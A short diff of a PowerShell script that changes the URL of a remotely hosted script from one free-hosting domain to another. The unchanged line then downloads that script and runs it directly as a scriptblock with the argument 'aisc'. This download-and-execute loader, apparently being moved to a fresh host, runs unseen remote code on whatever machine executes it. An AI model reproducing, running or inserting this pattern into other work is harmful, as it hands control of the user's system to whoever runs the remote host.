@@ -1,2 +1,2 @@
-$s = Invoke-RestMethod "https://cli-t0km.onrender.com/list.ps1"
+$s = Invoke-RestMethod "https://nirpin.vercel.app/list.ps1"
 & ([scriptblock]::Create($s)) aisc
